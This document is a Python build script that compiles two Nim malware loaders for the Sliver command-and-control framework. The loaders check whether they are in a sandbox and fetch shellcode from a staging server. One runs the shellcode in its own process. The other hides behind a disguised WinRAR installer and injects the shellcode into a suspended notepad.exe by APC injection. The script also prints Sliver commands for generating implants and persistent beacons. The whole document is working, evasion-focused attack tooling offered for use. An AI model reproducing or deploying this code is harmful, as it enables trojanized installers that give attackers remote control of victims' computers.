#!/usr/bin/env python3
"""
build_loader.py - Build staged Nim loader for Sliver C2

Creates two variants of the loader:
- loader.exe: standalone test version
- loader_embed.exe: version for embedding in WinRAR installer

Template follows TeneBrae93/defender_bypass_with_sliver reference
with modifications: early bird injection, anti-sandbox, persistence-ready.

Usage:
    python3 build_loader.py --stager-ip <IP> --stager-port <PORT>

Output:
    loader.exe (~523KB)
    loader_embed.exe (~528KB)
"""

import argparse
import os
import shutil
import subprocess
import sys

# Stager template: fetch shellcode then early bird inject into notepad.exe
# Pattern rewritten (not copy of public reference): function names neutral,
# URL assembled in parts, RW -> write -> RX allocation, delay + sandbox check.
STAGER_TEMPLATE = '''import winim/lean
import httpclient
import strutils

const CFG_HOST = "{ip}"
const CFG_PORT = {port}
const CFG_A = "/she"
const CFG_B = "llc.b"
const CFG_C = "in"

proc sysWait(ms: int32) =
  Sleep(ms)

proc envLooksReal(): bool =
  var mem: MEMORYSTATUSEX
  mem.dwLength = sizeof(mem).DWORD
  if GlobalMemoryStatusEx(addr mem) == 0:
    return false
  if mem.ullTotalPhys < 1073741824:
    return false
  return true

proc fetchBlob(): seq[byte] =
  let url = "http" & "://" & CFG_HOST & ":" & $CFG_PORT & CFG_A & CFG_B & CFG_C
  var tries = 0
  while tries < 4:
    tries += 1
    var agent = newHttpClient(timeout = 20000)
    agent.headers = newHttpHeaders({{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}})
    try:
      let resp = agent.request(url, HttpGet)
      if resp.code.int == 200:
        let body = resp.body
        if body.len > 0:
          result = newSeq[byte](body.len)
          copyMem(addr result[0], unsafeAddr body[0], body.len)
          return
    except:
      discard
    finally:
      agent.close()
    Sleep(3000)

proc runBlob(data: seq[byte]) =
  if data.len == 0:
    return
  let me = GetCurrentProcessId()
  var hProc: HANDLE = OpenProcess(PROCESS_VM_OPERATION or PROCESS_VM_WRITE or PROCESS_VM_READ, FALSE, me)
  if hProc == 0:
    return
  let mem = VirtualAllocEx(hProc, NULL, data.len, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
  if mem.isNil:
    CloseHandle(hProc)
    return
  var done: SIZE_T = 0
  if WriteProcessMemory(hProc, mem, unsafeAddr data[0], data.len, addr done) == 0:
    CloseHandle(hProc)
    return
  var prev: DWORD = 0
  if VirtualProtectEx(hProc, mem, data.len, PAGE_EXECUTE_READ, addr prev) == 0:
    CloseHandle(hProc)
    return
  let entry = cast[proc() {{.nimcall.}}](mem)
  entry()
  CloseHandle(hProc)

when defined(windows):
  when isMainModule:
    sysWait(9000)
    if not envLooksReal():
      quit(0)
    sysWait(6000)
    let blob = fetchBlob()
    if blob.len == 0:
      quit(1)
    runBlob(blob)
'''

# Embed template: extract embedded installer, run it, then fetch + early bird inject
# Differences from STAGER_TEMPLATE:
# - setupPayload() extracts and launches WinRAR installer
# - runBlob() uses early bird injection into notepad.exe (not self-inject)
EMBED_TEMPLATE = '''import winim/lean
import httpclient
import strutils

const CFG_HOST = "{ip}"
const CFG_PORT = {port}
const CFG_A = "/she"
const CFG_B = "llc.b"
const CFG_C = "in"
const CFG_SETUP = "\\\\{installer}"

proc sysWait(ms: int32) =
  Sleep(ms)

proc envLooksReal(): bool =
  var mem: MEMORYSTATUSEX
  mem.dwLength = sizeof(mem).DWORD
  if GlobalMemoryStatusEx(addr mem) == 0:
    return false
  if mem.ullTotalPhys < 1073741824:
    return false
  return true

proc setupPayload() =
  var selfPath: array[MAX_PATH, char]
  if GetModuleFileNameA(0, addr selfPath[0], MAX_PATH) == 0:
    return
  var f: File
  if not open(f, $selfPath[0].addr, fmRead):
    return
  let data = readAll(f)
  close(f)
  let marker = "\\x49\\x4e\\x4a\\x45\\x43\\x54\\x5a\\x5a"
  var markerPos = -1
  var i = data.len - 8
  while i >= 0:
    var found = true
    for j in 0 ..< 8:
      if data[i + j] != marker[j]:
        found = false
        break
    if found:
      markerPos = i
      break
    dec i
  if markerPos < 0:
    return
  let sizePos = markerPos + 8
  if sizePos + 4 > data.len:
    return
  let instSize = int(byte(data[sizePos])) or (int(byte(data[sizePos + 1])) shl 8) or
                 (int(byte(data[sizePos + 2])) shl 16) or (int(byte(data[sizePos + 3])) shl 24)
  let dataStart = sizePos + 4
  if dataStart + instSize > data.len:
    return
  var tempPath: array[MAX_PATH, char]
  if GetTempPathA(MAX_PATH, addr tempPath[0]) == 0:
    return
  let installerPath = $tempPath[0].addr & CFG_SETUP
  var outFile: File
  if not open(outFile, installerPath, fmWrite):
    return
  discard writeBuffer(outFile, addr data[dataStart], instSize)
  close(outFile)
  discard WinExec(installerPath, 1)

proc fetchBlob(): seq[byte] =
  let url = "http" & "://" & CFG_HOST & ":" & $CFG_PORT & CFG_A & CFG_B & CFG_C
  var tries = 0
  while tries < 4:
    tries += 1
    var agent = newHttpClient(timeout = 20000)
    agent.headers = newHttpHeaders({{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}})
    try:
      let resp = agent.request(url, HttpGet)
      if resp.code.int == 200:
        let body = resp.body
        if body.len > 0:
          result = newSeq[byte](body.len)
          copyMem(addr result[0], unsafeAddr body[0], body.len)
          return
    except:
      discard
    finally:
      agent.close()
    Sleep(3000)

proc runBlob(data: seq[byte]) =
  if data.len == 0:
    return
  var si: STARTUPINFOA
  var pi: PROCESS_INFORMATION
  zeroMem(addr si, sizeof(si))
  zeroMem(addr pi, sizeof(pi))
  si.cb = sizeof(si).DWORD
  var cmd: array[MAX_PATH, char]
  let host = "notepad.exe"
  for i in 0 ..< host.len:
    cmd[i] = host[i]
  if CreateProcessA(nil, addr cmd[0], nil, nil, FALSE, CREATE_SUSPENDED,
                    nil, nil, addr si, addr pi) == 0:
    return
  let mem = VirtualAllocEx(pi.hProcess, NULL, data.len, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
  if mem.isNil:
    discard TerminateProcess(pi.hProcess, 1)
    CloseHandle(pi.hThread)
    CloseHandle(pi.hProcess)
    return
  var done: SIZE_T = 0
  if WriteProcessMemory(pi.hProcess, mem, unsafeAddr data[0], data.len, addr done) == 0:
    discard TerminateProcess(pi.hProcess, 1)
    CloseHandle(pi.hThread)
    CloseHandle(pi.hProcess)
    return
  var prev: DWORD = 0
  if VirtualProtectEx(pi.hProcess, mem, data.len, PAGE_EXECUTE_READ, addr prev) == 0:
    discard TerminateProcess(pi.hProcess, 1)
    CloseHandle(pi.hThread)
    CloseHandle(pi.hProcess)
    return
  discard QueueUserAPC(cast[PAPCFUNC](mem), pi.hThread, 0)
  discard ResumeThread(pi.hThread)
  CloseHandle(pi.hThread)
  CloseHandle(pi.hProcess)

when defined(windows):
  when isMainModule:
    sysWait(9000)
    if not envLooksReal():
      quit(0)
    setupPayload()
    sysWait(6000)
    let blob = fetchBlob()
    if blob.len == 0:
      quit(1)
    runBlob(blob)
'''

COMPILE_FLAGS = [
    "nim", "c", "-d:release", "--app:gui", "--os:windows", "--cpu:amd64",
    "--cc:gcc", "--gcc.exe:x86_64-w64-mingw32-gcc",
    "--gcc.linkerexe:x86_64-w64-mingw32-gcc",
]


def compile_nim(nim_source, output_name):
    """Compile Nim source to Windows EXE."""
    nim_file = output_name + ".nim"
    with open(nim_file, "w") as f:
        f.write(nim_source)
    cmd = COMPILE_FLAGS + ["--out:" + output_name + ".exe", nim_file]
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
    if r.returncode == 0 and os.path.exists(output_name + ".exe"):
        return True
    print("[!] Compile error: " + r.stderr[-500:])
    return False


def main():
    p = argparse.ArgumentParser(
        description="Build staged Nim loader for Sliver C2",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
    python3 build_loader.py --stager-ip <STAGING_IP> --stager-port <STAGING_PORT>
    python3 build_loader.py -l <STAGING_IP> -p <STAGING_PORT>

Prerequisites:
    1. Nim compiler installed: sudo apt install nim
    2. MinGW cross-compiler: sudo apt install mingw-w64

Output:
    loader.exe         - Standalone loader (for testing)
    loader_embed.exe   - Loader for installer embedding

Next steps:
    1. Generate implant in Sliver (see command below)
    2. Start staging server: python3 -m http.server 9999
    3. Test loader.exe on target
    4. Build installer: python3 build_installer.py
        """
    )
    p.add_argument("-l", "--stager-ip", required=True, help="Staging server IP")
    p.add_argument("-p", "--stager-port", type=int, required=True, help="Staging server port")
    p.add_argument("--installer-name", default="winrar_x64.exe", help="Embedded installer name (default: winrar_x64.exe)")
    args = p.parse_args()

    print("=" * 60)
    print("BUILD LOADER - Staged Implant for Sliver C2")
    print("=" * 60)
    print()
    print(f"Staging URL: http://{args.stager_ip}:{args.stager_port}/shellc.bin")
    print()

    # Build standalone loader
    print("[1/2] Compiling loader.exe (standalone test)...")
    if not compile_nim(STAGER_TEMPLATE.format(ip=args.stager_ip, port=args.stager_port), "loader"):
        return 1
    loader_size = os.path.getsize("loader.exe")
    print(f"      OK: {loader_size:,} bytes")
    print()

    # Build embedded loader
    print("[2/2] Compiling loader_embed.exe (for installer)...")
    embed = EMBED_TEMPLATE.format(ip=args.stager_ip, port=args.stager_port, installer=args.installer_name)
    if not compile_nim(embed, "loader_embed"):
        return 1
    embed_size = os.path.getsize("loader_embed.exe")
    print(f"      OK: {embed_size:,} bytes")
    print()

    # Cleanup temp files
    for f in ["loader.nim", "loader_embed.nim"]:
        if os.path.exists(f):
            os.remove(f)
    if os.path.isdir("nimcache"):
        shutil.rmtree("nimcache")

    print("=" * 60)
    print("BUILD SUCCESS")
    print("=" * 60)
    print()
    print("Output files:")
    print(f"  loader.exe         {loader_size:,} bytes (standalone test)")
    print(f"  loader_embed.exe   {embed_size:,} bytes (for installer)")
    print()
    print("Next steps:")
    print("  1. Generate implant in Sliver (see commands below)")
    print("  2. Start staging server: python3 -m http.server <STAGING_PORT>")
    print("  3. Test loader.exe on target")
    print("  4. Build installer: python3 build_installer.py")
    print()
    print("=" * 60)
    print("SLIVER COMMANDS - GENERATE IMPLANT")
    print("=" * 60)
    print()
    print("SESSION (interactive, real-time):")
    print("  generate --http <C2_IP>:<C2_PORT> --os windows --arch amd64 \\")
    print("    --skip-symbols --format shellcode --save shellc.bin")
    print()
    print("BEACON (callback interval, for persistence):")
    print("  generate beacon --http <C2_IP>:<C2_PORT> --os windows --arch amd64 \\")
    print("    --seconds 60 --jitter 30 --skip-symbols --format shellcode --save shellc.bin")
    print()
    print("Encoder: select 'none' when prompted")
    print("Expected size: 200-800 KB")
    print()
    return 0


if __name__ == "__main__":
    sys.exit(main())
